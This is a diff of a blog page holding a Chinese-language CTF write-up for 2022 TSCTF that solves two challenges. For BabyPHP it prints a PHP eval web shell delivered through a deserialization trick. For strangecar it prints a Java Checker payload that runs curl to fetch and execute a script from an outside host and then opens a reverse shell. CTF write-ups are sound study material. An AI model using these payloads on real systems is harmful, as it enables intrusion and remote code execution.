@@ -16,12 +16,12 @@
     var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="1.BabyPHP文件泄露www.zip下载得到源码">
+  <meta name="description" content="1.BabyPHP 文件泄露www.zip下载得到源码">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022TSCTF">
 <meta property="og:url" content="https://ka1t4v.github.io/2022/05/20/TSCTF_WP/index.html">
 <meta property="og:site_name" content="Ka1t4v">
-<meta property="og:description" content="1.BabyPHP文件泄露www.zip下载得到源码">
+<meta property="og:description" content="1.BabyPHP 文件泄露www.zip下载得到源码">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000406186.png">
 <meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000513030.png">
@@ -219,9 +219,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="1-BabyPHP"><a href="#1-BabyPHP" class="headerlink" title="1.BabyPHP"></a>1.BabyPHP</h1><p>文件泄露<a target="_blank" rel="noopener" href="http://www.zip下载得到源码/">www.zip下载得到源码</a></p>
+        <h1>1.BabyPHP</h1>
+<p>文件泄露www.zip下载得到源码</p>
 <span id="more"></span>
-
 <p>发现在upload.php中有一个输出覆盖的问题</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000406186.png" alt="image-20220425000406186"></p>
 <p>如果上传文件名中包含%s字符将会输出上传目录</p>
@@ -229,7 +229,6 @@
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000513030.png" alt="image-20220425000513030"></p>
 <p>得到上传文件目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.7.2.146:8080/y0u_wi1l_n3v3r_f1nd</span><br></pre></td></tr></table></figure>
-
 <p>根据提示</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000709005.png" alt="image-20220425000709005"></p>
 <p>访问cat.php根据网页提示访问.cat.php.swp获取备份文件然后使用vim -r还原</p>
@@ -239,18 +238,16 @@
 <p>那么inc文件没有在黑名单中可以上传利用，并且要求文件名和类名一致</p>
 <p>这里生成a.inc然后上传,文件内容</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">    class a&#123;</span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">         eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">       public function __destruct()&#123;</span><br><span class="line">         eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
 <p>filename为序列化后的字符串，正常时</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=O:1:&quot;a&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>这里要求长度小于等于8并且过滤{}</p>
 <p>所以直接将后面{}删掉，同样会触发反序列化</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filenames=O:1:&quot;a&quot;:</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220424235725385.png" alt="image-20220424235725385"></p>
-<p>最后getshell，蚁剑连接，根目录发现&#x2F;flag.txt</p>
+<p>最后getshell，蚁剑连接，根目录发现/flag.txt</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425002025166.png" alt="image-20220425002025166"></p>
-<h1 id="2-strangecar"><a href="#2-strangecar" class="headerlink" title="2.strangecar"></a>2.strangecar</h1><p>关键点在利用服务器端的Checker类的exec方法，造成rce</p>
+<h1>2.strangecar</h1>
+<p>关键点在利用服务器端的Checker类的exec方法，造成rce</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425105745648.png" alt="image-20220425105745648"></p>
 <p>并且Checker类重写了readObject方法，反序列化时自动执行其中的exec方法，那么只要向服务器中传入序列化后的Checker对象即可</p>
 <p>构造恶意Cherker类，payload为<code>||curl$&#123;IFS&#125;http://10.128.247.54:8888/get.html|bash</code></p>
@@ -258,7 +255,6 @@
 <p><code>sh -c url||curl$&#123;IFS&#125;http://10.128.247.54:8888/get.html|bash</code></p>
 <p>${IFS}：dash中会识别为空格，但在runtime.exec中会识别为字符从而不会截断</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//恶意Checker类</span><br><span class="line">Checker checker = new Checker(100);</span><br><span class="line">Field cmd = checker.getClass().getDeclaredField(&quot;api_url&quot;);</span><br><span class="line">cmd.setAccessible(true);</span><br><span class="line">cmd.set(checker,&quot;||curl$&#123;IFS&#125;http://10.128.247.54:8888/get.html|bash&quot;);</span><br></pre></td></tr></table></figure>
-
 <p>本地vps开放8888端口，挂载get.html文件</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425111336018.png" alt="image-20220425111336018"></p>
 <p>查看Server#reportStatus()方法限制传入类为Car类，是实现了Iserver接口的reportStatus()方法</p>
@@ -283,7 +279,7 @@
 <p>然后f9执行到下一个断点，修改函数hash</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425114304081.png" alt="image-20220425114304081"></p>
 <p>f9继续执行，成功反弹shell</p>
-<p>最后根目录发现&#x2F;flag</p>
+<p>最后根目录发现/flag</p>
 
     </div>
 
@@ -364,7 +360,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-BabyPHP"><span class="nav-number">1.</span> <span class="nav-text">1.BabyPHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-strangecar"><span class="nav-number">2.</span> <span class="nav-text">2.strangecar</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">1.BabyPHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">2.strangecar</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
